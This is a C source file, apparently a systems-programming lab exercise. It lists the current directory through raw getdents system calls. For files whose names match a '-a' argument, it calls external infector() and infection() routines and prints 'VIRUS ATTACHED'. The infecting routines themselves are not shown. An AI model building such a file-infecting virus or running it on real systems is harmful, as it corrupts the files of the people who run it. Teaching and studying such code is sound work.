#include <dirent.h>
#include "util.h"
#define BUF_SIZE 8192
#define O_RDONLY 0
#define O_DIRECTORY 0200000
#define EXIT_FAILURE 1
#define SYS_GETDENTS 141
#define SYS_OPEN 5
#define SYS_WRITE 4
#define SYS_CLOSE 6
#define STDOUT_FILENO 1

extern int system_call(); 
extern void infection();
extern void infector(const char *filename);

struct linux_dirent { 
    long           d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};


int main (int argc , char* argv[], char* envp[]){
    int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;

    fd = system_call(SYS_OPEN,".", O_RDONLY | O_DIRECTORY, 0); 
    if (fd == -1) {
        return -1;
    }

    while ((nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE)) > 0) { //https://www.man7.org/linux/man-pages/man2/getdents.2.html
        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *)(buf + bpos);

            // check if the directory entry is a regular file
            if (*(buf + bpos + d->d_reclen - 1) == DT_REG) {
                int matched = 0; // flag to track if any argument matches

                for (int i = 1; i < argc; i++) {
                    if (argv[i][0] == '-' && argv[i][1] == 'a' && argv[i][2] != '\0') {

                        if (strncmp(d->d_name, argv[i] + 2, strlen(argv[i] + 2)) == 0) {

                            infector(d->d_name);

                            matched = 1;
                            infection();

                            // print infected file information
                            char out_buf[BUF_SIZE];
                            int out_len = 0;

                            int name_len = strlen(d->d_name);
                            for (int j = 0; j < name_len; j++) {
                                out_buf[out_len++] = d->d_name[j];
                            }
                            out_buf[out_len++] = ':';
                            out_buf[out_len++] = ' ';

                            char virus_msg[] = "VIRUS ATTACHED";
                            for (int j = 0; j < 14; j++) {
                                out_buf[out_len++] = virus_msg[j];
                            }
                            out_buf[out_len++] = '\n';

                            system_call(SYS_WRITE, STDOUT_FILENO, out_buf, out_len);

                           

                        }
                    }
                }

                if (!matched) {

                    char out_buf[BUF_SIZE];
                    int out_len = 0;

                    // add the filename to the output buffer
                    for (int j = 0; d->d_name[j] != '\0'; j++) {
                        out_buf[out_len++] = d->d_name[j];
                    }
                    out_buf[out_len++] = '\n';
                    system_call(SYS_WRITE, STDOUT_FILENO, out_buf, out_len);
                }
            }

            bpos += d->d_reclen;
        }
    }
    if (nread == -1) {
        system_call(SYS_CLOSE, fd, 0, 0);
        return -1;
    }

    system_call(SYS_CLOSE, fd, 0, 0);
    return 0;
}
